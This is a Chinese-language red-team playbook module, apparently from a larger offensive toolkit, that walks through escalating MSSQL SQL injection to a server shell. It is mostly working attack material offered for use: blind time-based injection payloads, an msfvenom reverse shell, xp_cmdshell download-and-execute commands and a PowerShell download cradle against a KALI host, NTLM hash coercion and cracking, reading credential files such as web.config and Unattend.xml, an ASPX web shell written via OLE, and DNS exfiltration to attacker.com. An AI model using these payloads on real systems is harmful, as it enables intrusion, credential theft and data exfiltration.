# MSSQL SQLi → Shell 完整攻击链

## MSSQL 完整攻击链（红队常用路径）

通过 HTTP/Web SQL Injection 拿到 MSSQL 查询能力后，将链条推进到服务器 Shell。直接扫描 1433 后连接 MSSQL 属于 `/recon`，不在本文件范围。

### 第1步 权限枚举（决定走哪条路）

```sql
-- 当前用户
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- 是否sysadmin（最关键的判断）
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 返回1 = sysadmin → 直接走RCE路径
-- 返回0 = 非sysadmin → 走IMPERSONATE/NTLM窃取/文件读取

-- 哪些功能已启用
SELECT name, value_in_use FROM sys.configurations
WHERE name IN ('xp_cmdshell','clr enabled','Ole Automation Procedures','external scripts enabled');

-- 当前权限列表
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- 所有sysadmin用户（找IMPERSONATE目标）
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Linked Server（横移目标）
SELECT * FROM sys.servers;

-- SQL Server服务账户身份（判断是否域用户）
SELECT servicename, service_account FROM sys.dm_server_services;
```

盲注场景下的权限枚举：
```sql
-- sysadmin检测
'; IF(IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:3'--

-- xp_cmdshell是否启用
'; IF((SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell')=1) WAITFOR DELAY '0:0:3'--
```

### 第2步 攻击路径选择

```
sysadmin:
  xp_cmdshell启用 → 直接执行（最快）
  xp_cmdshell禁用 → 开启xp_cmdshell / CLR Assembly / MLS / OLE Automation
  全部被禁 → 文件读写 + NTLM hash窃取

非sysadmin:
  有IMPERSONATE权限 → 模拟sa → 走sysadmin路径
  无IMPERSONATE → 检查 xp_dirtree/xp_fileexist 等是否对当前上下文可执行，再评估NTLM coercion
  PUBLIC权限 → 只能使用实际授予PUBLIC/当前用户的对象权限；不要默认所有实例都允许NTLM coercion
```

### 第3步a RCE路径（sysadmin时）

xp_cmdshell / CLR / MLS / OLE 的具体命令见上方"数据库RCE"章节。

反弹shell（从xp_cmdshell获取交互式shell）：
```sql
-- 生成payload（Kali端）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o rev.exe
-- 或用PowerShell base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://KALI/shell.ps1')"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

-- 通过xp_cmdshell下载+执行
EXEC xp_cmdshell 'certutil -urlcache -f http://KALI/rev.exe C:\Users\Public\rev.exe';
EXEC xp_cmdshell 'C:\Users\Public\rev.exe';

-- 或直接PowerShell反弹（一条命令）
EXEC xp_cmdshell 'powershell -e <上面生成的base64>';
```

### 第3步b NTLM 凭据 coercion 路径（常不需要sysadmin，但必须验证对象执行权限）

```sql
-- 原理：强制MSSQL服务账户向攻击者发起NTLM认证
-- 部分SQL Server版本/配置中这些扩展过程可被低权限上下文调用，但不是通用保证。
-- 先直接执行无害UNC probe；Permission denied则不要把这条链当可用。

-- 触发NTLM认证（以下任一）
EXEC master..xp_dirtree '\\KALI\share';
EXEC master..xp_fileexist '\\KALI\share\file';
EXEC master..xp_subdirs '\\KALI\share';

-- 盲注场景
'; EXEC master..xp_dirtree '\\KALI\share'--

-- Kali端接收（二选一）
sudo responder -I tun0
# 或
sudo impacket-smbserver share . -smb2support

-- 抓到NTLMv2 hash，格式如：
-- YOURDOM\sqlsvc::YOURDOM:1122334455667788:AAA....:0101...
-- 保存为 hash.txt

-- 破解
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

-- 破解成功 → 拿到域凭据 sqlsvc:Password123
-- 拿到凭据后，本模块只判断它能否换成目标服务器Shell。
# 例如确认目标主机WinRM确实开放且该账户有权限时：
nxc winrm TARGET -u sqlsvc -p 'Password123'
# 能远程登录/执行 → Shell obtained → /web-attack COMPLETE
# 只有域凭据但暂时没有Shell → 记录凭据，继续当前Web→Shell链；不要在这里展开AD。
```

### 第3步c 文件读写路径

```sql
-- 读OS文件（需BULK INSERT权限或sysadmin）
CREATE TABLE #tmp (data varchar(max));
BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM #tmp;

-- OPENROWSET读文件（需Ad Hoc Distributed Queries启用或sysadmin）
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;
-- web.config里经常有数据库连接字符串、API密钥

-- 高价值文件列表
-- C:\inetpub\wwwroot\web.config        # .NET连接字符串
-- C:\Users\Administrator\Desktop\*     # 管理员桌面
-- C:\Windows\Panther\Unattend.xml      # 可能有明文密码
-- C:\Windows\System32\config\SAM       # 被锁定，但值得尝试

-- 写文件（通过OLE，需sysadmin）
DECLARE @o INT; EXEC sp_oacreate 'Scripting.FileSystemObject', @o OUT;
DECLARE @f INT; EXEC sp_oamethod @o,'CreateTextFile',@f OUT,'C:\inetpub\wwwroot\cmd.aspx',1;
EXEC sp_oamethod @f,'WriteLine',NULL,'<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>';
```

### 第4步 成功门控：Shell obtained

```text
xp_cmdshell / OLE / CLR / External Scripts / 文件落地
        ↓
拿到可交互或可稳定执行OS命令的上下文
        ↓
/web-attack COMPLETE
```

**拿到 Shell 后不要在本文件继续本地提权或 AD 横向。** `whoami /priv`、SeImpersonate、Potato、服务提权等属于 `/privesc-win`。本文件最多记录“建议下一步模块”。

### 盲注高效数据提取

```sql
-- 二分法逐字符（比逐个WAITFOR快一倍）
-- 提取数据库名第1个字符
'; IF(ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>64) WAITFOR DELAY '0:0:3'--
-- 延迟3秒 → 字符>64 → 继续测>96
-- 无延迟 → 字符<=64 → 继续测>32
-- 6-7次二分确定一个字符

-- DNS带外快速提取（比时间盲注快10倍+）
'; DECLARE @d varchar(99); SET @d=(SELECT TOP 1 name FROM sys.databases);
  EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\x"')--
-- attacker.com的DNS日志直接收到数据库名
-- 配合 interactsh-client 或自建DNS服务器接收

-- sqlmap自动化盲注
sqlmap -r req.txt -p id --technique=T --time-sec=3 --threads=1 --dbms=mssql --batch
# 加 --dns-domain=attacker.com 用DNS带外加速
```
